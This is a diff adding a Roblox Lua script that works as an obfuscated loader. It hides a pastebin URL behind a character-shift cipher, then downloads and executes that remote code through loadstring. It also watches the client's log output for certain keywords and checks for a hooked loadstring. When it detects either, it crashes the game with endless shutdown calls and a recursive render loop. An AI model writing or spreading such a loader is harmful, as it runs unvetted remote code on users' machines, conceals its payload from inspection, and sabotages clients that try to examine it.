@@ -1,0 +1,42 @@
+local ok1 = "kwwsv=22sdvwhelq1frp2udz2KWqPugyk"
+local function dec(str,s)
+	local new = ""
+	for i = 1,#str do
+		new = new .. string.char(string.byte(str:sub(i,i)) + s)
+	end
+	return new
+end
+local function getLine(str)
+	local list = str:split(":")
+	return list[#list]
+end
+local line = getLine(debug.traceback())
+local unsafe = false
+local no = "https://pastebin.com/raw/Amn6X9XQ"
+local test = game:GetService("LogService").MessageOut:Connect(function(m)
+	if tostring(m):find("van") or tostring(m):lower():find("ass") or tostring(m):lower():find("nr") or tostring(m):lower():find("sec") then
+		unsafe = true
+		for i = 1,10 do
+			game:shutdown()
+		end
+		repeat game:shutdown() local _=1 until nil
+	end
+end)
+pcall(function()
+	local ok = game:HttpGet("https://pastebin.com/raw/mDnrN3sg")
+	getfenv()['loadstring'](no)()
+	game:GetService('RunService').RenderStepped:Wait()
+end)
+task.wait(0.1)
+if unsafe==true or loadstring~=getfenv()['loadstring'] then
+	local no = nil
+	no = function()
+		task.wait()
+		game:GetService('RunService').RenderStepped:Connect(no)
+		return no()
+	end
+	game:GetService('RunService').RenderStepped:Connect(no)
+else
+	test:Disconnect()
+	getfenv()['loadstring'](game:HttpGet(dec(ok1,-3)))()
+end
